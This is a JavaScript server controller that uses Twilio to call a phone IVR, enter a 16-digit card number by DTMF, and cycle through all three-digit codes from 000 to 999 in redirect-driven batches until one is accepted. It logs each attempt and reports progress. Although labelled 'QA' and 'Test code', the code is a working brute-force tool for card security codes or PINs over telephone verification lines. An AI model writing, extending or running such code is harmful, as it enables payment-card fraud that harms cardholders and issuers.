import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('test_value')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();
    
    let card = attempt.test_value;
    let testCode = '';
    
    if (attempt.test_value.includes(':')) {
        [card, testCode] = attempt.test_value.split(':');
    }

    if (testCode) {
        // This is a Test code brute force run!
        await AttemptModel.addLog(attemptId, `Call connected. Starting brute force for card: ${card}. Trying first code: ${testCode}...`);
        
        // Use Twilio's Redirect verb to jump to our loop handler
        const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
        twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${testCode}&isFirst=true`);
        
    } else {
        // Standard non-Test code test run
        await AttemptModel.addLog(attemptId, `Call connected. Sending DTMF sequence: ${card}`);
        const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
        twiml.pause({ length: waitSeconds });
        twiml.play({ digits: `wwww${card}` });
        
        // Standard wait and hangup
        twiml.pause({ length: 15 });
        twiml.hangup();
    }

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.say('An error occurred during call orchestration.');
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling the continuous TwiML Redirect loop
export const handleTryCode = async (req, res) => {
    const { attemptId } = req.params;
    let { currentTestCode, isFirst } = req.query;
    
    let currentCodeNum = parseInt(currentTestCode);
    
    // Safety check for exhausted codes
    if (currentCodeNum > 999) {
        await AttemptModel.addLog(attemptId, `Exhausted all Test codes 001-999. Failed.`);
        await AttemptModel.updateAttemptStatus(attemptId, 'failed', 0, { error: 'Exhausted 999 Test codes without success' });
        const twiml = new twilio.twiml.VoiceResponse();
        twiml.hangup();
        res.type('text/xml');
        return res.send(twiml.toString());
    }
    
    // Get base card for logging
    const { data: attempt } = await supabase.from('attempts').select('test_value').eq('id', attemptId).single();
    let baseCard = '1234567890123456';
    if (attempt && attempt.test_value) {
        baseCard = attempt.test_value.split(':')[0];
    }
    
    const twiml = new twilio.twiml.VoiceResponse();
    
    const BATCH_SIZE = 5;
    const endCodeNum = Math.min(currentCodeNum + BATCH_SIZE, 1000);
    
    let lastCodeInBatch = '';
    const batchLogs = [];

    for (let i = currentCodeNum; i < endCodeNum; i++) {
        const codeStr = i.toString().padStart(3, '0');
        lastCodeInBatch = codeStr;

        if (i === currentCodeNum && isFirst === 'true') {
            batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
            const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 5;
            twiml.pause({ length: waitSeconds });
            twiml.play({ digits: `ww${baseCard}wwwwwwww${codeStr}` });
        } else {
            batchLogs.push(`IVR says "Incorrect Test Code" for ${codeStr}. Trying next...`);
            batchLogs.push(`DTMF Sent: ${baseCard}:${codeStr}`);
            // Wait 0.5 seconds (1 'w') to let IVR speak before playing next
            twiml.play({ digits: `w${codeStr}` });
        }
    }
    
    await AttemptModel.addLogs(attemptId, batchLogs);
    
    // Update the DB so the frontend shows the current Test code progressing
    await AttemptModel.updateTestValue(attemptId, `${baseCard}:${lastCodeInBatch}`);
    
    const nextTestCode = endCodeNum.toString().padStart(3, '0');
    
    // Give the IVR time to say "Incorrect" for the final guess in the batch
    const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
    twiml.gather({
        action: `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`,
        method: 'POST',
        timeout: 1,
        input: 'dtmf',
        numDigits: 1
    });
    
    // FALLBACK: If Gather times out because the IVR didn't press a button, 
    // Twilio falls through to here. We MUST explicitly redirect!
    twiml.redirect({ method: 'POST' }, `${host}/api/call/try/${attemptId}?currentTestCode=${nextTestCode}&isFirst=false`);
    
    res.type('text/xml');
    return res.send(twiml.toString());
};

// Webhook for handling the interactive listen loop (DEPRECATED - Replaced by handleTryCode)
export const handleInteractiveListen = async (req, res) => {
    // Keep this for backwards compatibility if needed, but it is no longer used in the main flow
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
};

// Webhook for tracking call status updates from Twilio
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

    if (CallStatus === 'completed') {
      const duration = parseInt(CallDuration) || 0;
      await AttemptModel.updateAttemptStatus(attemptId, 'completed', duration, { twilioStatus: CallStatus });
    } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
      const duration = parseInt(CallDuration) || 0;
      await AttemptModel.updateAttemptStatus(attemptId, 'failed', duration, { error: `Call failed with status: ${CallStatus}` });
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingUrl, RecordingStatus } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);
    if (RecordingUrl) {
      await AttemptModel.addLog(attemptId, `Recording URL: ${RecordingUrl}`);

      // Start transcription and analysis asynchronously
      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
        console.error(`Error transcribing recording for attempt #${attemptId}:`, err);
      });
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};
